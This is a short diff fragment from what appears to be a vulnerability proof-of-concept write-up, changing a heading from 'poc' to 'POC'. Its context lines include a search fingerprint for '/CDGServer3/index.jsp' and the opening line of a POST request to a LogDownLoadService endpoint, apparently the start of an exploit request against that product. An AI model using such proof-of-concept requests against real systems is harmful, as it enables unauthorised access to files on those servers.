@@ -6,7 +6,7 @@
 body="/CDGServer3/index.jsp"
 ```
 
-## poc
+## POC
 
 ```java
 POST /CDGServer3/logManagement/LogDownLoadService HTTP/1.1
